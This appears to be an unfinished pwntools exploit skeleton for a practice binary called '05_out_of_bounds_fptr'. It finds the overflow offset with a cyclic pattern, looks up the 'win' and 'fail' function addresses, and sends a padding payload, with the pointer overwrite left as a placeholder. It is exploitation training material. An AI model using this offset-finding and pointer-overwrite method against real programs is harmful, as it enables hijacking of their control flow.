#!/usr/bin/env python2
from pwn import *

def calculate_offset():
    io = process('./05_out_of_bounds_fptr')
    log.info('Skipping prompt')
    io.readuntil('input:')

    log.info('Sending De Bruijn sequence')
    io.sendline(cyclic(100, n=8)) # 64bit address
    io.readuntil(': ')

    target = io.readline()
    target = target.rstrip() # Trim trailing newline
    log.info("Our target value is corrupted to be: {}".format(target))

    target = int(target, 16)
    distance = cyclic_find(target, n=8)
    log.info("The target is {} bytes into our overflow".format(distance))

    return distance

def exploit(distance):
    io = process('./05_out_of_bounds_fptr')

    payload = 'A' * distance
    # payload += '???'

    log.info('Skipping prompt')
    io.readuntil('input:')

    log.info('Sending payload')
    io.sendline(payload)

    io.interactive()

def get_addresses():
    # pwntools way of: readelf -s 05_out_of_bounds_fptr | grep 'win\|fail'
    e = ELF('./05_out_of_bounds_fptr')
    win = e.symbols['win']
    fail = e.symbols['fail']

    log.info('Win: {}'.format(hex(win)))
    log.info('Fail: {}'.format(hex(fail)))

if __name__ == '__main__':
    get_addresses()
    offset = calculate_offset()
    exploit(offset)
